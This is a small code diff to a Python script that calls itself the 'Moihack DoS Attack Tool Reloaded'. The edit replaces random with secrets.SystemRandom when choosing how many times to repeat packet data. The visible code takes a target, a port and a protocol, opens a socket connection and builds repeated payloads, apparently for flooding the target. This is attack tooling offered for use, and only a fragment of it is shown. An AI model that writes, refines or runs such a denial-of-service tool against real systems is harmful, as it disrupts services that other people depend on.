@@ -1,4 +1,5 @@
-import socket,random,sys
+import socket,sys
+import secrets
 
 print("""Welcome to Moihack DoS Attack Tool Reloaded
 Command syntax is Target -Port Number -Protocol[TCP/UDP] -Random Packet Creation[On/Off]
@@ -21,7 +22,7 @@ while True:
 
     Sock.connect(Adr)
     if Rap=='ON' or Rap=='On' or Rap=='on':
-        Bytes=(Data*random.randrange(16,64))
+        Bytes=(Data*secrets.SystemRandom().randrange(16,64))
         BytesEnc=str.encode(Bytes)
     elif Rap=='OFF' or Rap=='Off' or Rap=='off':
         Bytes=(Data*64)
